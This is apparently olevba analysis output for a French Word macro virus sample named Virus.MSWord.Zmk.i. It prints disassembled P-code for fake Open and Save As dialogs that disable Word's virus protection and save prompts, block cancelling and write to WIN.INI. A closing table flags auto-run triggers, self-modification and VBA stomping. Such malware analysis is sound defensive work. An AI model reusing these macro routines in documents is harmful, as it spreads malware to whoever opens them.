' 	LitStr 0x001B "Word 4.0-5.1 pour macintosh"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #36:
' 	LitStr 0x000F "WordPerfect 5.x"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #37:
' 	LitStr 0x000F "WordPerfect 6.x"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #38:
' 	LitStr 0x0021 "Feuille de calcul Microsoft Excel"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #39:
' 	LitStr 0x000B "Lotus 1-2-3"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #40:
' 	LitStr 0x0016 "Works pour Windows 3.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #41:
' 	LitStr 0x0016 "Works 4.0 pour Windows"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #42:
' 	LitStr 0x0015 "Récupération de texte"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #43:
' 	LitStr 0x000D "Windows Write"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #44:
' 	LitStr 0x0018 "Word pour MS-DOS 3.x-5.x"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #45:
' 	LitStr 0x0014 "Word pour MS-DOS 6.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #46:
' 	LitStr 0x000B "aujourd'hui"
' 	Ld ComboBox5 
' 	ArgsMemCall AddItem 0x0001 
' Line #47:
' 	LitStr 0x0013 "la semaine dernière"
' 	Ld ComboBox5 
' 	ArgsMemCall AddItem 0x0001 
' Line #48:
' 	LitStr 0x000D "Cette semaine"
' 	Ld ComboBox5 
' 	ArgsMemCall AddItem 0x0001 
' Line #49:
' 	LitStr 0x000F "le mois dernier"
' 	Ld ComboBox5 
' 	ArgsMemCall AddItem 0x0001 
' Line #50:
' 	LitStr 0x000A "ce mois-ci"
' 	Ld ComboBox5 
' 	ArgsMemCall AddItem 0x0001 
' Line #51:
' 	LitStr 0x000F "n'importe quand"
' 	Ld ComboBox5 
' 	ArgsMemCall AddItem 0x0001 
' Line #52:
' 	EndSub 
' Macros/VBA/FileSA - 10360 bytes
' Line #0:
' 	FuncDefn (Private Sub ComboBox2_Change())
' Line #1:
' 	Ld ComboBox2 
' 	MemLd vbInformation 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #2:
' 	LitStr 0x0016 "Veuillez entrer un nom"
' 	Ld wdFormatText 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #3:
' 	ElseBlock 
' Line #4:
' 	Ld ComboBox2 
' 	MemLd vbInformation 
' 	ParamNamed Value 
' 	Ld ViewVBCode 
' 	ParamNamed Save 
' 	Ld FullName 
' 	ArgsMemCall FileFormat 0x0002 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	LitStr 0x0006 "FileSA"
' 	LitStr 0x0005 "Choix"
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall Debut 0x0004 
' Line #7:
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Ld wdFormatText 
' 	LitStr 0x000D "Virus Hider98"
' 	ArgsCall MsgBox 0x0003 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #11:
' 	LitStr 0x0006 "FileSA"
' 	LitStr 0x0005 "Choix"
' 	LitDI2 0x0000 
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall Debut 0x0004 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #15:
' 	LitStr 0x001E "Impossible d'acceder à ce menu"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	LitStr 0x0006 "FileSA"
' 	LitStr 0x0005 "Choix"
' 	LitDI2 0x0000 
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall Debut 0x0004 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #20:
' 	LitStr 0x0014 "Pas assez de mémoire"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #21:
' 	LitStr 0x0006 "FileSA"
' 	LitStr 0x0005 "Choix"
' 	LitDI2 0x0000 
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall Debut 0x0004 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #25:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #26:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	Ld CurDir 
' 	Ld ComboBox1 
' 	MemSt Then 
' Line #30:
' 	LitStr 0x000D "Document Word"
' 	Ld ComboBox3 
' 	MemSt Then 
' Line #31:
' 	LitStr 0x000E "Documents Word"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #32:
' 	LitStr 0x0012 "Modèle de document"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #33:
' 	LitStr 0x000F "Texte seulement"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #34:
' 	LitStr 0x0023 "Texte seulement avec sauts de ligne"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #35:
' 	LitStr 0x000C "Texte MS-DOS"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #36:
' 	LitStr 0x0020 "Texte MS-DOS avec sauts de ligne"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #37:
' 	LitStr 0x0017 "Texte mis en forme(RTF)"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #38:
' 	LitStr 0x000D "Texte unicode"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #39:
' 	LitStr 0x001F "Texte avec mise en page(MS-DOS)"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #40:
' 	LitStr 0x0018 "Texte avec mise en forme"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #41:
' 	LitStr 0x000D "HTML Document"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #42:
' 	LitStr 0x0014 "Word 2.x for Windows"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #43:
' 	LitStr 0x0017 "Word 4.0 pour Macintosh"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #44:
' 	LitStr 0x0017 "Word 5.0 pour Macintosh"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #45:
' 	LitStr 0x0017 "Word 5.1 pour Macintosh"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #46:
' 	LitStr 0x000F "WordPerfect 5.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #47:
' 	LitStr 0x0018 "WordPerfect 5.1 pour DOS"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #48:
' 	LitStr 0x001C "WordPerfect 5.x pour Windows"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #49:
' 	LitStr 0x002E "Fichier secondaire pour WordPerfect 5.1 ou 5.2"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #50:
' 	LitStr 0x0027 "Fichier secondaire pour WordPerfect 5.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #51:
' 	LitStr 0x0016 "Works pour Windows 3.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #52:
' 	LitStr 0x0016 "Works 4.0 pour Windows"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #53:
' 	LitStr 0x000B "Word 6.0/95"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #54:
' 	LitStr 0x001A "Word for Windows (generic)"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #55:
' 	LitStr 0x0011 "Windows Write 3.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #56:
' 	LitStr 0x0017 "Word for MS-DOS 3.x-5.x"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #57:
' 	LitStr 0x0013 "Word for MS-DOS 6.0"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #58:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Regarder dans:H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ouvrir@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Appronfondir...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chercher les fichiers qui repondent � ces crit�res:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de fichier:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type de fichier:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Documents WordH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Texte ou propri�t�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Modifi� en dernierH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n'importe quand
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RechercherD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nouvelle rech.H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 0 Fichier(s) trouv�(s)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enregister dans:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EnregisterD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Options...D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enreg. versionH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de fichier:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type de fichier:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Documents Word'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox5'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b"n'importe quand"
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileOp/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Zmk.i' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton2_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ComboBox2_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |User32.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

